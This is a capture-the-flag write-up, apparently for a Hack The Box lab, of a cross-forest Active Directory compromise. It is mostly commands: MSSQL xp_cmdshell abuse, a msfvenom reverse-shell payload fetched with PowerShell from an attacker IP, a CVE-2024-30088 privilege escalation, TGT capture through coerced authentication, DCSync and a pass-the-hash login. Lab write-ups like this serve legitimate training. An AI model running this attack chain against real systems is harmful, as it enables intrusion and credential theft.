## Review

I loved this machine. It requires only one public CVE, everything else is a mix of misconfigurations
and Active Directory features used in creative ways. What makes it stand out is the dual-domain
scenario, which forces you to constantly think about where you are and where you need to go next.
The trust relationship at the core of the challenge feels realistic and teaches you something
genuinely useful about how AD environments can be abused in the wild.

**Personal Rating:** ⭐⭐⭐⭐ (4.5/5)

**Recommended for:** People who want to get their hands dirty with Active Directory trusts and
cross-domain attacks in a realistic scenario.

## How I Completed It

Scope credentials: `john.w / RFulUtONCOL!`

### Initial Enumeration

Like always, I started with an nmap scan to discover open ports and the services running on them.

```bash
# Simple nmap scan
nmap -p- --min-rate 1000 -T4 -Pn --open $target -oN ports.txt

# Extract ports and run service scan
export ports=$(grep -oP '^\d+(?=/tcp)' ports.txt | tr '\n' ',' | sed 's/,$//')
nmap -p$ports -sV -sC -oN detailedScan.txt $target
```

Standard AD ports plus MSSQL on 1433. Since I had valid credentials, I started with SMB enumeration.

```bash
smbmap -H $target -u 'john.w' -p 'RFulUtONCOL!'
```

Nothing interesting there, so I moved on to BloodHound.

```bash
echo $target darkzero.htb dc01.darkzero.htb | tee -a /etc/hosts

python3 bloodhound.py -u 'john.w' -p 'RFulUtONCOL!' -d 'darkzero.htb' -ns $target -c All
```

john.w had no outbound permissions, no kerberoastable users, no AS-REP roastable accounts.
However, the collector reported a trust relationship, so I enumerated it.

```bash
ldapsearch -x -H ldaps://$target \
  -D 'john.w@darkzero.htb' -w 'RFulUtONCOL!' \
  -b 'DC=darkzero,DC=htb' \
  -o tls_reqcert=never \
  '(objectClass=trustedDomain)' name trustDirection trustType trustAttributes
```

```
trustAttributes: 2056
# 0x808 -> CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION + FOREST_TRANSITIVE
```

A bidirectional forest trust with TGT delegation enabled. This is the key finding of the whole machine.
I resolved the second domain's IP address:

```bash
dig @$target darkzero.ext
# Result: 172.16.20.2 — only reachable internally, pivot through DC01 needed
```

### Foothold via MSSQL Linked Server

The second DC was on a private network, so I needed a foothold on DC01 first. I turned to the MSSQL instance.

```bash
impacket-mssqlclient -windows-auth darkzero.htb/john.w:'RFulUtONCOL!'@$target
```

john.w landed as a guest on DC01 with no meaningful permissions. However, enumerating linked servers
revealed a connection to DC02.darkzero.ext, and john.w turned out to be sysadmin there.

```sql
EXEC sp_linkedservers;
-- Found: DC02.darkzero.ext

EXECUTE ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
EXECUTE ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
EXECUTE ('EXEC xp_cmdshell ''whoami''') AT [DC02.darkzero.ext];
-- Result: darkzero-ext\svc_sql
```

I then dropped a staged Meterpreter payload on DC02 via PowerShell download through xp_cmdshell.
Stageless payloads had I/O issues in this context, staged worked fine.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.237 LPORT=5555 -f exe -o shell_staged.exe
python3 -m http.server 9998
```

```sql
EXECUTE ('EXEC xp_cmdshell ''powershell -c "iwr http://10.10.14.237:9998/shell_staged.exe -OutFile C:\Windows\Temp\NotAShell.exe"''') AT [DC02.darkzero.ext];
EXECUTE ('EXEC xp_cmdshell ''C:\Windows\Temp\NotAShell.exe''') AT [DC02.darkzero.ext];
```

```bash
# MSF listener
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.237
set LPORT 5555
run
```

### Privilege Escalation on DC02

To harvest TGTs I needed SYSTEM. I used `local_exploit_suggester` to identify a suitable CVE.

One important note: the LPE exploit kept dying when run on the same session used for the initial shell.
The solution was to spawn a second independent Meterpreter session and run the exploit against that one.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.237 LPORT=5556 -f exe -o shell_staged2.exe
```

```bash
# From session 1, spawn session 2
execute -f C:\Windows\Temp\NotAShell2.exe

# LPE on session 2
use exploit/windows/local/cve_2024_30088_authz_basep
set SESSION 2
set LHOST 10.10.14.237
set LPORT 5557
run
# Result: SYSTEM on DC02
```

### TGT Harvesting via Coercion

With SYSTEM on DC02 I could run Rubeus. The `CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION` flag on the
trust means that when DC01 authenticates to DC02, its TGT gets forwarded. I just needed to coerce
that authentication.

```bash
# Upload Rubeus and start monitoring
upload /path/to/Rubeus.exe C:\\Windows\\Temp\\NotRu.exe
execute -f C:\\Windows\\Temp\\NotRu.exe -a "monitor /interval:5 /nowrap" -i
```

Then from the MSSQL session, I triggered DC01 to authenticate to DC02:

```sql
EXEC xp_dirtree '\\DC02.darkzero.ext\share'
```

Rubeus captured DC01$'s TGT. One important detail: the ticket issuer is `DARKZERO.HTB`, not `.EXT`.

### DCSync and Domain Takeover

```bash
echo "<base64_ticket>" | base64 -d > dc01.kirbi
impacket-ticketConverter dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache

# Sync clock to avoid Kerberos errors
sudo ntpdate -u $target

# DCSync
impacket-secretsdump -k -no-pass darkzero.htb/DC01\$@DC01.darkzero.htb
```

Got the Administrator NTLM hash. Logged in with Evil-WinRM and grabbed the flags from the Desktop.

```bash
evil-winrm -i $target -u administrator -H <hash>
```
